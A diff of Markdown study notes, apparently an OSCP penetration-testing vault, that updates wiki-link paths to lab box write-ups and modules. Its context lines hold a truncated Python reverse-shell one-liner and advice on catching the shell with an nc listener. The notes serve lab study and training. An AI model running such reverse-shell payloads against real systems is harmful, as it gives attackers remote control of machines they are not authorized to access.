@@ -112,7 +112,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 **Where to look in the response:** nothing in an HTTP response, success is your `nc -nvlp` listener receiving a connection and dropping you into a `$` or `#` prompt. If the listener never fires, check that the target actually has a `python`/`python3` binary reachable by that exact name (some targets alias one but not the other) before assuming the payload itself is wrong.
 
-🔁 **Seen in:** [[3. Bashed#3. Upgrade to a Reverse Shell|3. Bashed, "Upgrade to a Reverse Shell"]].
+🔁 **Seen in:** [[OSCP/BOXES/WRITE UPS/Linux/Bashed|3. Bashed, "Upgrade to a Reverse Shell"]].
 
 #### Tags: #ReverseShell #Python #Dup2 #CommandBreakdowns
 
@@ -194,7 +194,7 @@ This page turns one repeatable part of an authorized assessment into a checklist
 
 ## Related Modules
 
-- [[MODULES/06. Information Gathering]] -- module concepts used by this hub page
+- [[OSCP/MODULES/06. Information Gathering]] -- module concepts used by this hub page
 
 ## Demonstrated in box write-ups
 
